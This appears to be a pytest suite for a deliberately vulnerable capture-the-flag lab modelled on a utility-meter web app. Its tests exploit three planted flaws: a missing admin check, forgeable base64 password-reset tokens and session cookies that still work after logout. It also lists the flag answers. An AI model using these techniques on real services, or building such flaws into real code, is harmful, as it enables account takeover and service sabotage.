import base64

import requests

PRIVESC_TEACH = "FLAG{BLACKOUT_ECHO}"       # customer disconnects a meter that isn't theirs
OLDTOKEN_EXERCISE = "FLAG{STALE_SIGNAL}"    # stale password-reset token, still accepted
SESSIONREUSE_BONUS = "FLAG{BACKDOOR_TICKET}"  # captured cookie still works after logout


def test_privesc_teach(devon, base_url):
    # meter id 2 doesn't belong to devon -- disconnecting it as a plain
    # customer (no role=admin check on this route) is the escalation.
    resp = devon.post(f"{base_url}/admin/meters/2/disconnect", timeout=10)
    assert resp.status_code == 200
    assert PRIVESC_TEACH in resp.text


def test_oldtoken_exercise(anon_session, base_url):
    # ben's password isn't relied on as ben anywhere else in this suite --
    # deliberately chosen so this permanent password change is harmless.
    token = base64.urlsafe_b64encode(b"ben.osei@example.com:1000").decode()
    resp = anon_session.post(
        f"{base_url}/reset-password",
        data={"token": token, "password": "pwned-by-test-suite"},
        timeout=10,
    )
    assert resp.status_code == 200
    assert OLDTOKEN_EXERCISE in resp.text


def test_sessionreuse_bonus(login_fn, base_url):
    session, _ = login_fn("carla.reyes@example.com", "carla123")
    token = session.cookies.get("wgs_session")
    assert token, "expected a wgs_session cookie after login"

    logout_resp = session.post(f"{base_url}/logout", timeout=10)
    assert logout_resp.status_code in (200, 302)

    # Replay the captured (now logged-out) token manually.
    replay = requests.Session()
    replay.verify = False
    replay.cookies.set("wgs_session", token)
    resp = replay.get(f"{base_url}/dashboard", timeout=10)
    assert resp.cookies.get("flag_session_reuse") == SESSIONREUSE_BONUS
